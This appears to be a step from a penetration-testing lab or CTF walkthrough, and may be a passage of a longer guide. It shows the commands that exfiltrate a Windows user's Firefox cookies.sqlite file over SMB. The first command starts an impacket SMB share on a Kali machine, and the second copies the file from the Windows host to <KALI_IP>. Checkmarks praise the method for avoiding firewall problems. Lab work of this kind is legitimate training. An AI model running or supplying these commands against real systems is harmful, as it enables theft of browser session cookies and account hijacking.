## STEP 3 (CORRECT) – Use SMB to send file to Kali

### On **Kali**:

```
sudo impacket-smbserver share ~/Desktop -smb2support
```

---

### On **Windows RDP**:

```
copy C:\Users\grace\Desktop\cookies.sqlite \\<KALI_IP>\share\
```

✔ File now lands on Kali Desktop  
✔ No hosting on Windows  
✔ No firewall problems